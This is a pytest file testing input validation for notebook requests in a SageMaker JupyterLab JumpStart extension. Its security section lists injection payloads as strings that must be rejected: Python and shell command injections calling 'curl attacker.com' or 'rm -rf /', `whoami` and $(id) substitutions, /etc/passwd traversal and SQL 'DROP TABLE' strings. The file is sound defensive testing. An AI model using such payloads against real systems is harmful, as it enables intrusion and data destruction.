from pydantic.v1 import ValidationError
from sagemaker_jupyterlab_extension_common.jumpstart.notebook_types import (
    JumpStartResourceType,
)
from sagemaker_jupyterlab_extension_common.jumpstart.request import NotebookRequest
import pytest


@pytest.mark.parametrize(
    "input_request",
    [
        {
            "key": "pmm-notebook/notebook.ipynb",
            "resource_type": "modelSdkNotebook",
            "model_id": "test-model-id",
            "endpoint_name": "test-endpoint-name",
            "inference_component": "test-inference-component",
            "hub_name": "test-hub-name",
        },
        {
            "key": "pmm-notebook/notebook.ipynb",
            "resource_type": "modelSdkNotebook",
            "model_id": "test-model-id",
            "endpoint_name": "test-endpoint-name",
            "inference_component": "test-inference-component",
        },
        {
            "key": "nova-notebooks/notebook.ipynb",
            "recipe_path": "/recipes/training/nova/recipe.yaml",
            "resource_type": "novaNotebook",
        },
        {
            "key": "oss-notebook/notebook.ipynb",
            "resource_type": "openSourceNotebook",
            "recipe_path": "/recipes/fine-tuning/llama/dpo.yaml",
            "cluster_id": "test-cluster-1",
        },
        {
            "key": "oss-notebook/notebook.ipynb",
            "resource_type": "openSourceNotebook",
            "base_model_name": "llama-3-1-8b",
            "customization_technique": "SFT",
            "model_package_group_name": "my-model-group",
            "data_set_name": "my-dataset",
            "data_set_version": "v1.0",
        },
    ],
)
def test_notebook_request_happy_case(input_request):
    NotebookRequest(**input_request)


def test_notebook_request_when_only_key_is_specified():
    request = {
        "key": "pmm-notebook/notebook.ipynb",
    }
    validated_input = NotebookRequest(**request)
    assert validated_input.resource_type == JumpStartResourceType.default


@pytest.mark.parametrize(
    "notebook_request,expected",
    [
        [
            {
                "key": "pmm-notebook/notebook.ipynb",
                "resource_type": "modelSdkNotebook",
            },
            "model_id is required when resource_type is modelSdkNotebook",
        ],
        [
            {
                "key": "pmm-notebook/notebook.ipynb",
                "resource_type": "inferNotebook",
            },
            "endpoint_name is required when resource_type is inferNotebook",
        ],
        [
            {
                "key": "pmm-notebook/notebook.ipynb",
                "resource_type": "invalidNotebook",
            },
            "value is not a valid enumeration member",
        ],
        [
            {
                "key": "pmm-notebook/notebook.ip",
            },
            "string does not match regex",
        ],
        [
            {
                "key": "pmm-notebook/notebook.ipynb",
                "endpoint_name": "1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111",
            },
            "ensure this value has at most 63 characters",
        ],
        [
            {
                "key": "pmm-notebook/notebook.ipynb",
                "endpoint_name": "1____1",
            },
            "string does not match regex",
        ],
        [
            {
                "key": "nova-notebooks/notebook.ipynb",
                "recipe_path": "a" * 257,
                "resource_type": "novaNotebook",
            },
            "ensure this value has at most 256 characters",
        ],
        [
            {
                "key": "nova-notebooks/notebook.ipynb",
                "recipe_path": "path with spaces/recipe.yaml",
                "resource_type": "novaNotebook",
            },
            "string does not match regex",
        ],
        [
            {
                "key": "nova-notebooks/notebook.ipynb",
                "recipe_path": "/another/recipe_01-test.json",
                "resource_type": "novaNotebook",
            },
            "does not conform to the expected recipe path format",
        ],
        [
            {
                "key": "nova-notebooks/notebook.ipynb",
                "recipe_path": "/recipes/fine-tuning/nova/../../../bib/ls",
                "resource_type": "novaNotebook",
            },
            "does not conform to the expected recipe path format",
        ],
        [
            {
                "key": "nova-notebooks/notebook.ipynb",
                "recipe_path": "/another/recipe_01-test.json",
                "resource_type": "novaNotebook",
            },
            "does not conform to the expected recipe path format",
        ],
        [
            {
                "key": "nova-notebooks/notebook.ipynb",
                "recipe_path": "recipe_name.py",
                "resource_type": "novaNotebook",
            },
            "does not conform to the expected recipe path format",
        ],
        [
            {
                "key": "oss-notebook/notebook.ipynb",
                "resource_type": "openSourceNotebook",
                "customization_technique": "INVALID_TECHNIQUE",
            },
            "Unsupported customization technique",
        ],
        [
            {
                "key": "oss-notebook/notebook.ipynb",
                "resource_type": "openSourceNotebook",
                "base_model_name": "invalid model name!",
            },
            "string does not match regex",
        ],
        [
            {
                "key": "oss-notebook/notebook.ipynb",
                "resource_type": "openSourceNotebook",
                "model_package_group_name": "invalid-group-name!",
            },
            "string does not match regex",
        ],
        [
            {
                "key": "oss-notebook/notebook.ipynb",
                "resource_type": "openSourceNotebook",
                "data_set_version": "invalid version!",
            },
            "string does not match regex",
        ],
        [
            {
                "key": "oss-notebook/notebook.ipynb",
                "resource_type": "openSourceNotebook",
                "data_set_name": "invalid dataset name!",
            },
            "string does not match regex",
        ],
    ],
)
def test_notebook_request_failed_with_validation_error(notebook_request, expected):
    with pytest.raises(ValidationError, match=expected):
        NotebookRequest(**notebook_request)


# Security Tests - Code Injection Prevention
@pytest.mark.parametrize(
    "field_name,malicious_value",
    [
        # Code injection with quotes and semicolons
        ("model_id", 'test-model"; import os; os.system("curl attacker.com") #'),
        ("cluster_id", 'cluster-1"; import os; os.system("malicious") #'),
        ("connection_id", 'conn-1\'; __import__("os").system("evil") #'),
        ("domain", 'd-123"; import subprocess; subprocess.call("bad") #'),
        ("hub_name", 'hub-1"; import sys; sys.exit() #'),
        ("inference_component", 'comp-1"; os.system("rm -rf /") #'),
        ("endpoint_name", 'endpoint-1"; import os; os.system("evil") #'),
        ("recipe_path", '/recipes/test/test/test.yaml"; import os #'),
        ("base_model_name", 'model-1"; import os; os.system("bad") #'),
        ("customization_technique", 'SFT"; import os #'),
        ("model_package_group_name", 'group-1"; import os #'),
        ("data_set_name", 'dataset-1"; import os #'),
        ("data_set_version", 'v1"; import os #'),
        # Shell metacharacters
        ("model_id", "test-model; curl attacker.com"),
        ("cluster_id", "cluster-1 && malicious"),
        ("connection_id", "conn-1 | evil"),
        ("domain", "d-123 `whoami`"),
        ("hub_name", "hub-1 $(id)"),
        ("endpoint_name", "endpoint-1; malicious"),
        ("recipe_path", "/recipes/test/test/test.yaml && evil"),
        ("base_model_name", "model-1 | evil"),
        ("customization_technique", "SFT; malicious"),
        ("model_package_group_name", "group-1 && evil"),
        ("data_set_name", "dataset-1 | evil"),
        ("data_set_version", "v1; malicious"),
        # Spaces (should fail)
        ("model_id", "test model with spaces"),
        ("cluster_id", "cluster 1"),
        ("domain", "domain with spaces"),
        ("endpoint_name", "endpoint with spaces"),
        ("recipe_path", "/recipes/test/test/file with spaces.yaml"),
        ("base_model_name", "model with spaces"),
        ("customization_technique", "SFT with spaces"),
        ("model_package_group_name", "group with spaces"),
        ("data_set_name", "dataset with spaces"),
        ("data_set_version", "v1 with spaces"),
        # Special characters
        ("model_id", "test-model!@#$%"),
        ("cluster_id", "cluster-1<>?"),
        ("connection_id", "conn-1[]{}"),
        ("domain", "d-123()"),
        ("endpoint_name", "endpoint-1!@#"),
        ("recipe_path", "/recipes/test/test/test.yaml!@#"),
        ("base_model_name", "model-1!@#"),
        ("customization_technique", "SFT!@#"),
        ("model_package_group_name", "group-1!@#"),
        ("data_set_name", "dataset-1!@#"),
        ("data_set_version", "v1!@#"),
        # Path traversal attempts
        ("model_id", "../../../etc/passwd"),
        ("cluster_id", "../../malicious"),
        ("base_model_name", "../../../etc/passwd"),
        # SQL injection patterns
        ("model_id", "test' OR '1'='1"),
        ("domain", "d-123'; DROP TABLE users--"),
        ("base_model_name", "model' OR '1'='1"),
        ("data_set_name", "dataset'; DROP TABLE data--"),
    ],
)
def test_code_injection_prevention(field_name, malicious_value):
    """Test that malicious payloads are blocked by regex validation."""
    request = {
        "key": "test-notebook/notebook.ipynb",
        field_name: malicious_value,
    }
    with pytest.raises(
        ValidationError, match="string does not match regex|invalid characters"
    ):
        NotebookRequest(**request)


# Root Validator Tests
def test_root_validator_applies_default_sanitization_to_fields_without_regex():
    """Test that root validator applies default sanitization to fields without explicit regex."""
    # set_default_kernel is a boolean, should not be sanitized
    request = {
        "key": "test-notebook/notebook.ipynb",
        "set_default_kernel": True,
    }
    validated = NotebookRequest(**request)
    assert validated.set_default_kernel is True


def test_root_validator_skips_fields_with_explicit_regex():
    """Test that root validator doesn't interfere with fields that have explicit regex."""
    # js_model_id has explicit regex, should use that instead of root validator
    request = {
        "key": "test-notebook/notebook.ipynb",
        "resource_type": "modelSdkNotebook",
        "model_id": "valid-model-123",
    }
    validated = NotebookRequest(**request)
    assert validated.js_model_id == "valid-model-123"


def test_root_validator_allows_valid_characters():
    """Test that root validator allows safe characters: alphanumeric, hyphens, underscores, dots, slashes."""
    # Test by creating a mock field without explicit regex
    from unittest.mock import Mock

    valid_values = [
        "simple-value",
        "value_with_underscore",
        "value.with.dots",
        "path/to/value",
        "complex-value_123.test/path",
    ]

    # Create a mock field without regex
    mock_field = Mock()
    mock_field.name = "test_field"

    # Mock the __fields__ to simulate a field without regex
    original_fields = NotebookRequest.__fields__.copy()
    mock_field_info = Mock()
    mock_field_info.field_info.regex = None
    NotebookRequest.__fields__["test_field"] = mock_field_info

    try:
        for value in valid_values:
            # Call the sanitize_all_strings validator directly
            result = NotebookRequest.sanitize_all_strings(value, mock_field)
            assert result == value, f"Valid value '{value}' should pass root validator"
    finally:
        # Restore original fields
        NotebookRequest.__fields__ = original_fields


def test_root_validator_blocks_dangerous_characters():
    """Test that root validator blocks code injection characters."""
    from unittest.mock import Mock

    dangerous_values = [
        'value"; import os',  # Quotes and semicolon
        "value; malicious",  # Semicolon
        "value && evil",  # Shell operator
        "value | evil",  # Pipe
        "value `whoami`",  # Backticks
        "value $(id)",  # Command substitution
        "value with spaces",  # Spaces
        "value!@#$%",  # Special characters
        "value(){}[]",  # Brackets
    ]

    # Create a mock field without regex
    mock_field = Mock()
    mock_field.name = "test_field"

    # Mock the __fields__ to simulate a field without regex
    original_fields = NotebookRequest.__fields__.copy()
    mock_field_info = Mock()
    mock_field_info.field_info.regex = None
    NotebookRequest.__fields__["test_field"] = mock_field_info

    try:
        for value in dangerous_values:
            # Call the sanitize_all_strings validator directly
            with pytest.raises(ValueError, match="invalid characters"):
                NotebookRequest.sanitize_all_strings(value, mock_field)
    finally:
        # Restore original fields
        NotebookRequest.__fields__ = original_fields


# Edge Cases
@pytest.mark.parametrize(
    "field_name,edge_case_value,should_pass",
    [
        # Valid edge cases
        ("model_id", "a", True),  # Single character
        ("model_id", "a" * 256, True),  # Max length
        ("cluster_id", "cluster_123", True),  # Underscore allowed
        ("domain", "d-123-abc", True),  # Multiple hyphens
        ("hub_name", "a1", True),  # Min valid length
        ("inference_component", "a" * 63, True),  # Max length
        # Invalid edge cases
        ("model_id", "", False),  # Empty string
        ("model_id", "a" * 257, False),  # Over max length
        ("hub_name", "1start", True),  # Starts with number (allowed)
        ("hub_name", "-start", False),  # Starts with hyphen
        ("inference_component", "a" * 64, False),  # Over max length
    ],
)
def test_edge_cases(field_name, edge_case_value, should_pass):
    """Test edge cases for parameter validation."""
    request = {
        "key": "test-notebook/notebook.ipynb",
        field_name: edge_case_value,
    }
    if should_pass:
        NotebookRequest(**request)
    else:
        with pytest.raises(ValidationError):
            NotebookRequest(**request)


# Anchor Tests - Ensure $ is present
@pytest.mark.parametrize(
    "field_name,value_with_trailing_junk",
    [
        ("model_id", "valid-model-123-JUNK-SHOULD-FAIL"),
        ("cluster_id", "cluster-1-EXTRA"),
        ("connection_id", "conn-1-TRAILING"),
        ("domain", "d-123-INVALID"),
        ("hub_name", "hub-1-EXTRA-CHARS"),
        ("inference_component", "comp-1-TRAILING-DATA"),
    ],
)
def test_regex_anchors_prevent_trailing_content(field_name, value_with_trailing_junk):
    """Test that regex patterns with $ anchor reject values with trailing content."""
    # These should fail because the values exceed valid patterns
    request = {
        "key": "test-notebook/notebook.ipynb",
        field_name: value_with_trailing_junk,
    }
    # Note: Some may pass if within character limits, adjust test as needed
    try:
        NotebookRequest(**request)
    except ValidationError:
        pass  # Expected for truly invalid patterns
